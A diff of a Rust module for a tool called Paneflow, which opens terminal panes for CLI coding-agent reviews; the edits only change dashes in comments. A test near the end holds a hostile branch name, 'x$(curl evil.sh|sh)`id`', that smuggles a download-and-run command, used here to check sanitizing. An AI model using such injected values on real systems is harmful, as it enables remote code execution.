@@ -3,7 +3,7 @@
 //! Human-in-the-loop by design: clicking Review picks one or more CLIs and opens
 //! a REAL terminal pane per CLI in the branch's worktree, launches the CLI, and
 //! PRE-FILLS its input with a compact review prompt (the user submits). No
-//! headless ACP session — you see exactly what the agent does, in a real
+//! headless ACP session - you see exactly what the agent does, in a real
 //! terminal. See [[feedback-human-in-loop-no-headless]]. This module owns the
 //! embedded terminal entity, CLI table, prompt builder, and shell-aware launch
 //! request used by `DiffView`.
@@ -17,7 +17,7 @@ pub(crate) struct ReviewTerminal {
 }
 
 /// A CLI coding agent Paneflow can launch in a terminal for a review. Unlike the
-/// ACP layer (Claude Code + Codex only), the terminal path supports every CLI —
+/// ACP layer (Claude Code + Codex only), the terminal path supports every CLI -
 /// it just spawns the binary in a shell.
 #[derive(Clone, Copy, PartialEq, Eq, Debug)]
 pub(crate) enum ReviewCli {
@@ -75,7 +75,7 @@ impl ReviewCli {
 /// chars, so valid revspec characters (`~ ^ : @ / . - _ +`) pass through.
 fn sanitize_ref_for_prompt(reference: &str) -> String {
     // `!` triggers bash history expansion (on by default in interactive bash),
-    // so it joins the set even though it isn't a classic metacharacter — it is
+    // so it joins the set even though it isn't a classic metacharacter - it is
     // not a revspec operator, so dropping it never corrupts an app-emitted ref.
     const SHELL_ACTIVE: &[char] = &[
         '`', '$', ';', '|', '&', '(', ')', '<', '>', '\'', '"', '\\', '*', '?', '[', ']', '{', '}',
@@ -88,12 +88,12 @@ fn sanitize_ref_for_prompt(reference: &str) -> String {
 }
 
 /// EP-005: the per-hunk "act" intents surfaced by the hover action cluster.
-/// Each builds a distinct PRE-FILLED prompt (the human reviews + submits — no
+/// Each builds a distinct PRE-FILLED prompt (the human reviews + submits - no
 /// auto-submit, no native git write by Paneflow). Distinct from the review
 /// framing of [`build_cli_review_prompt`].
 #[derive(Clone, Copy, PartialEq, Eq, Debug)]
 pub(crate) enum HunkAction {
-    /// US-018: open-ended "direct the agent at this hunk" — pastes the hunk as
+    /// US-018: open-ended "direct the agent at this hunk" - pastes the hunk as
     /// context, the human types the directive.
     Direct,
     /// US-019: apply the good parts + stage selectively, agent-run.
@@ -107,7 +107,7 @@ pub(crate) enum HunkAction {
 /// intent. The hunk's unified diff is pasted inline (it is hunk-specific, unlike
 /// the whole-branch review which references git), matching the existing
 /// `ask_review_about_hunk` paste. Copy never claims Paneflow itself stages or
-/// discards — the agent performs any git write in the witnessed terminal.
+/// discards - the agent performs any git write in the witnessed terminal.
 pub(crate) fn build_cli_hunk_prompt(action: HunkAction, path: &str, hunk_diff: &str) -> String {
     match action {
         HunkAction::Direct => format!("Here is a hunk from `{path}` to act on:\n\n{hunk_diff}\n"),
@@ -124,7 +124,7 @@ pub(crate) fn build_cli_hunk_prompt(action: HunkAction, path: &str, hunk_diff: &
 }
 
 /// Build the compact, human-in-loop review prompt to PRE-FILL into the CLI input.
-/// The CLI runs in the worktree cwd, so it inspects the diff itself via git —
+/// The CLI runs in the worktree cwd, so it inspects the diff itself via git -
 /// transparent (you see it run `git diff`) and tiny (no pasted diff). When
 /// `adversarial`, ask it to play the skeptical second reviewer (used for the
 /// 2nd CLI in a multi-CLI "second opinion").
@@ -148,7 +148,7 @@ pub(crate) fn build_cli_review_prompt(branch: &str, base: &str, adversarial: boo
         "Review the changes this branch (`{branch}`) adds vs `{base}`, including uncommitted work. \
          Inspect the diff yourself with git (e.g. `git diff $(git merge-base HEAD {base})` plus \
          `git status`). {lens}Review ONLY the changed lines for bugs, security issues, regressions, \
-         and broken invariants — skip style nits unless harmful. Give a one-line verdict (SAFE or \
+         and broken invariants - skip style nits unless harmful. Give a one-line verdict (SAFE or \
          the top concern), then findings as `path:line [blocker|suggestion|nit] note`."
     )
 }
@@ -245,7 +245,7 @@ mod tests {
         // f001 residual: a branch named via a crafted `.git/HEAD` (e.g.
         // `x$(curl evil|sh)`, a legal single-line git ref that survives the
         // control-byte strip in parse_head) must not reach the prefilled prompt
-        // as live command substitution — the template wraps {branch} in
+        // as live command substitution - the template wraps {branch} in
         // backticks and the text can land on a live shell if the CLI is absent.
         let p = build_cli_review_prompt("x$(curl evil.sh|sh)`id`", "main", false);
         assert!(
